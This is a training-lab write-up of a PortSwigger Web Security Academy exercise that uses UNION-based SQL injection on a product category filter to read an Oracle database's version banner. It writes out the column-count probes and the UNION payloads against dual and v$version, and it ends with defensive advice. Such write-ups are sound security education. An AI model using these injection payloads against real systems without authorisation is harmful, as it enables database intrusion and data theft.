# PortSwigger SQL Injection — Oracle Database Version via UNION

- Platform: PortSwigger Web Security Academy
- Category: SQL injection / Examining the database
- Difficulty: Practitioner
- Goal: query the Oracle database version
- Result: solved

## Summary

The category filter is injectable and can be used for a UNION-based version query. The vulnerable endpoint is:

```text
/filter?category=Gifts
```

The injection point is a string literal in the category predicate.

## Column count

`ORDER BY` probing showed two columns:

```text
Gifts' ORDER BY 1--     -> OK
Gifts' ORDER BY 2--     -> OK
Gifts' ORDER BY 3--     -> server error
```

## Oracle-specific details

Oracle requires a `FROM` clause even for constant selects. The standard dummy table is:

```sql
dual
```

The database version banners are exposed through:

```sql
v$version
```

## Payload

Initial UNION test:

```text
Gifts' UNION SELECT NULL,NULL FROM dual--
```

String visibility test:

```text
Gifts' UNION SELECT 'abc','def' FROM dual--
```

Final version query:

```text
Gifts' UNION SELECT NULL,banner FROM v$version--
```

The second column was visible and produced:

```text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

## Defensive takeaway

Use parameterized queries and avoid exposing SQL errors. Production database accounts should not expose unnecessary metadata views to application users.